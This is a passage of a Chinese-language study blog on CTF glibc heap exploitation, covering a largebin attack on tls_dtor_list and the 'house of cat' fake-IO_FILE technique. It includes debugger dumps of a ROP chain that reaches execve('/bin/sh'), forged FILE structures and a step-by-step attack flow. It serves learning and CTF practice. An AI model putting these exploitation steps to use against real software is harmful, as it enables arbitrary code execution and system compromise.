class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a522d0</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x00005572d1a52b90</span></span><br><span class="line"><span class="number">0x5572d1a522e0</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a522f0</span>:	<span class="number">0x00005572d1a52fb0</span>	<span class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a52300</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x00005572d1a533d0</span></span><br><span class="line"><span class="number">0x5572d1a52310</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a52320</span>:	<span class="number">0x00005572d1a537f0</span>	<span class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a52330</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x00005572d1a53c10</span></span><br><span class="line"><span class="number">0x5572d1a52340</span>:	<span class="number">0x0000000000000418</span>	<span class="number">0x0000000000000841</span>				<span class="comment">//原本为0x421</span></span><br><span class="line"><span class="number">0x5572d1a52350</span>:	<span class="number">0x00007fa2a9bbace0</span>	<span class="number">0x00007fa2a9bbace0</span></span><br><span class="line"><span class="number">0x5572d1a52360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>重新申请第一个 chunk 区域，第二个 chunk 的数据就会被更改了。</p>
<p>我们就完成了 libc 的泄露，下面就是堆 heap 地址的泄露，只要有了 overlap 我们就完成了两地址的泄露 ，这里不在细说。</p>
<p>接下来就是利用 largebinattack 攻击，首先修改 tls_dtor_list 的值为一个我们可控制的 chunk 地址。然后修改 secret 为已知可控地址。secret 是 tcache,fastbin 加密 key。</p>
<p>tls_dtor_list 结构体的为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">struct</span> dtor_list *) <span class="number">0x563bed37d920</span></span><br><span class="line">$<span class="number">8</span> = &#123;</span><br><span class="line">  func = <span class="number">0x525a0543f9580000</span>,</span><br><span class="line">  obj = <span class="number">0x7f16ef9363e5</span> &lt;iconv+<span class="number">197</span>&gt;,</span><br><span class="line">  <span class="built_in">map</span> = <span class="number">0x7f16efae4698</span>,</span><br><span class="line">  next = <span class="number">0x7f16ef937e51</span> &lt;__gconv_close_transform+<span class="number">225</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">+++++++++++++++++++++++</span><br><span class="line">pwndbg&gt; tel <span class="number">0x563bed37d920</span> <span class="number">10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x563bed37d920</span> ◂— <span class="number">0x525a0543f9580000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x563bed37d928</span> —▸ <span class="number">0x7f16ef9363e5</span> (iconv+<span class="number">197</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x563bed37d930</span> —▸ <span class="number">0x7f16efae4698</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x563bed37d938</span> —▸ <span class="number">0x7f16ef937e51</span> (__gconv_close_transform+<span class="number">225</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x563bed37d940</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x563bed37d948</span> —▸ <span class="number">0x7f16efa2b497</span> (qecvt+<span class="number">39</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x563bed37d950</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x563bed37d958</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x563bed37d960</span> —▸ <span class="number">0x7f16ef9f70f0</span> (execve) ◂— endbr64</span><br></pre></td></tr></table></figure>
<p>总结下，这里。00 的位置，其实是任意代码执行的，除了可以写 leave，但是貌似这里的写法已经很直接，所以我们无需再更改，如有需要可以写为 orw.secret 其实是否需要改写，是根据是否可以泄露出 secret 而定，如果可以，就不需要改写，一些攻击即可。</p>
<p>我们修改 tls_dtor_list 为一个堆头地址，我们还要将这个头部改写，因为任意代码执行就是这个直接地址开始的。</p>
<p>关于 largebinattack，如果 bin 只有一个 free_chunk，我们攻击的话，只需要修改其 bk_nextsize。</p>
<p>同时，我们也可以进行多次攻击，只要是 size 比第一个小，就会进行前插，但是这次不是修改第一个头的 bk_next, 而是第一次那个。就是说在同一个位置修改，其他尽量保持不变。</p>
<p>关键就在与修改 tls_dtor_list，开始这里是空的，将其指向一个 chunk, 并且完全控制这里，在这里构造一个 leave ret 加上 rop，注意的是 leaveret 的地址要进行加密。</p>
<h2 id="house-of-cat"><a class="markdownIt-Anchor" href="#house-of-cat">#</a> house of cat</h2>
<p>这是一个比较新的路径，是 catF1y 师傅挖出来的一条链子，并且在强网杯初赛部署了同名题目。但是，就在比赛前夕，以为师傅连更两条博客，house of apple2 以及 house of apple3，导致了题目被非预期。同时，我们也尝试了使用 house of emma，成功非预期。这里就先开始预期解的 house of cat 的学习记录。</p>
<p>高版本的 glibc 就是对 io 的疯狂脑洞输出。house of cat 也是一个有关 io 的利用路径。</p>
<h3 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件">#</a> 利用条件</h3>
<ul>
<li>1. 能够任意地址写一个可控堆地址。</li>
<li>2. 能够泄露堆地址和 libc 基址。</li>
<li>3. 能够触发 IO 流（FSOP 或触发__malloc_assert），执行 IO 相关函数。</li>
</ul>
<p>其实从这里我们看出，这里的利用条件与其他的一些手法极为相似，基本就是利用 exit () 函数退出的一些操作。随着版本的迭代，glibc 对于虚表的保护也是不断的更新，首先就是对于 io_file_jump 的检查，包括但不限于禁止直接修改虚表内容、检查虚表地址是否合法（在规定的虚表地址范围内）。其实之前我们讲过利用 io_str_jump 的虚表绕过检查，但是当时的方法的弊端就是两个函数_IO_str_overflow 以及_IO_str_finish 的相关漏洞被封死。</p>
<p>这里作者利用了一个新的 io 虚表结构体_IO_wfile_jumps，然后下面的操作与_IO_str_jumps 非常相似，甚至函数名字都很相似</p>
<p>这里我先介绍下目标函数是如何实现然亦函数调用的，</p>
<p>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>原理，利用程序报错__malloc_asset 报错调用 xsputn, 替换该虚表函数为 _IO_wfile_seekfoff</p>
<p>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
<p>其中的函数（_IO_wfile_seekoff）的内部结构为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 mode!=0 且 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 会调用_IO_switch_to_wget_mode 这个函数，继续跟进代码。虽然说这里要求的是 mode 值不为零，但是在最开始伪造的时候，mode 设置却还是 0，不过调试的时候，发现这里可能会发生变化，从我们传入的 0 变为了 - 1。经过测试，最开始也可以将 mode 设置为 1 ，后面触发__malloc_assert,mode 不会被更改。（这条仅在 house of cat 同名题目测试）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而_IO_WOVERFLOW 是 glibc 里定义的一个宏调用函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
<p>可以看到对_IO_WOVERFLOW 没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> 0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line"> 0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line"> 0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line"> 0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line"> 0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line"> 0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"></span><br><span class="line"> 0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line"> 0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line"> 0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
<p>在造成任意地址写一个堆地址的基础上，这里的寄存器 rdi（fake_IO 的地址）、rax 和 rdx 都是我们可以控制的，</p>
<p>rdi 是我们伪造的 io_file 的地址，我们将 rax 控制为堆上的一个地址，就可以实现任意函数的调用。</p>
<p>这里还要补习一下 setcontext 的知识</p>
<p>在开启沙箱的情况下，假如把最后调用的 [rax + 0x18] 设置为 setcontext，把 rdx 设置为可控的堆地址，就能执行 srop 来读取 flag；如果未开启沙箱，则只需把最后调用的 [rax + 0x18] 设置为 system 函数，把 fake_IO 的头部写入 /bin/sh 字符串，就可执行 system (&quot;/bin/sh&quot;)</p>
<p>fake_IO 结构体需要绕过的检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp``-``&gt;_lock是一个可写地址</span><br><span class="line">fp``-``&gt;_mode ``=` `<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>大致的攻击流程</p>
<ol>
<li>修改_IO_list_all 为可控地址（FSOP）或修改 stderr 为可控地址 (__malloc_assert)。</li>
<li>在上一步的可控地址中伪造 fake_IO 结构体。</li>
<li>通过 FSOP 或 malloc 触发攻击。</li>
</ol>
<p>但是当我进行到这里的时候，我发现不能独立正常的复现，因为作者的文章并没有给出这条完整利用链。</p>
<h3 id="问题"><a class="markdownIt-Anchor" href="#问题">#</a> 问题</h3>
<ul>
<li>完整的利用链是从哪里触发， 完整的函数调用链是怎么样的？</li>
<li>作者提出了两个不同的流程，一个是进行 FSOP，利用的是_IO_flush_all_lockp 函数来刷新所有的 IO 流。也就是说最后是进入 flush 函数，进行一系列的调用，对应的就是虚表中的_IO_overflow. 但是_IO_flush_all_lockp 触发的前提应该是能执行 exit (显式调用、libc 调用 abort、以及 main 函数正常退出)</li>
<li>另外一个思路是利用利用__malloc_assert 触发的报错。会使用 stderr 进行一个报错输出</li>
</ul>
<p>以上，house of cat 的关键点是 JUMP_INIT (seekoff, _IO_wfile_seekoff), 顺利的进入后又会执行 _IO_switch_to_wget_mode (fp)，最大的问题就是如何进入这里 _IO_wfile_seekoff?</p>
<p>以下为个人的分析过程</p>
<p>我们要知道这里代替了谁。函数的入口在于 IO 函数初始化后调用谁的问题，因为我们是对 vtable 进行了偏移替换，所以我们将二者进行一个对比。</p>
<p>修改前的 IO_list_all 的对应</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7f56882ae680</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7f56882ae680</span> </span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f56882ae6a0</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f56882ae6a0</span> </span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540025</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f56882ae723</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f56882ae724</span> &lt;_IO_2_1_stderr_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7f56882ae780</span> &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">    _fileno = <span class="number">2</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f56882afa60</span> &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f56882ad8a0</span> &lt;_IO_wide_data_2&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f56882aa600</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7f5688120070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7f5688120e40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7f5688120b30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7f5688121de0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7f5688123300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7f568811f680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7f568811f330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7f568811e960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7f5688122530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7f568811e620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7f568811e4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7f5688112b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7f568811f9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7f568811ef40</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7f568811e6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7f568811e610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7f568811ef30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7f56881234a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7f56881234b0</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改后 (地址不一样，看偏移)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x562fcda56370</span></span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x451</span> &lt;error: Cannot access memory at address <span class="number">0x451</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f2b2d5cc0e0</span> &lt;main_arena+<span class="number">1120</span>&gt; <span class="string">&quot; t\245\315/V&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x562fcda55290</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x562fcda55290</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f2b2d5cc840</span> &lt;_IO_2_1_stdout_+<span class="number">192</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x562fcda57cd0</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x7f2b2d405a6d</span> &lt;setcontext+<span class="number">61</span>&gt; <span class="string">&quot;H\213\242\240&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">0</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x562fcda56000</span>,</span><br><span class="line">    _offset = <span class="number">0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x562fcda563a0</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 